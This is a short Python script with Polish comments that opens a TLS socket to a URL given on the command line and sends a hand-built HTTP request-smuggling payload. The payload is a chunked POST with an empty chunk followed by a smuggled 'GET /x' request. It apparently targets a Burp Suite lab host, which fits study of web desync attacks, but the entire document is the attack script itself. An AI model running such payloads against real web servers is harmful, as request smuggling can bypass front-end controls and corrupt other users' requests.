import socket
import ssl
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    host_burp = burp_url[8:]  # Usuwamy "https://"

    # Utworzenie połączenia socketowego i owinięcie go w warstwę SSL
    context = ssl.create_default_context()
    with socket.create_connection((host_burp, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=host_burp) as ssock:
            # Zbudowanie zapytania HTTP
            request = (
                "POST / HTTP/2\r\n"
                f"Host: {host_burp}\r\n"
                "Transfer-Encoding: chunked\r\n\r\n"
                "0\r\n\r\n"  # Zakończenie bloku chunked
                "GET /x HTTP/1.1\r\n"  # Drugie zapytanie GET
                f"Host: {host_burp}\r\n\r\n"
            )

            # Wysyłanie zbudowanego zapytania
            ssock.sendall(request.encode())

            # Odbieranie odpowiedzi (wielokrotne odbieranie w pętli, jeśli odpowiedź jest długa)
            response = b""
            while True:
                data = ssock.recv(4096)
                if not data:
                    break
                response += data

            # Wyświetlanie odpowiedzi
            print(response.decode())
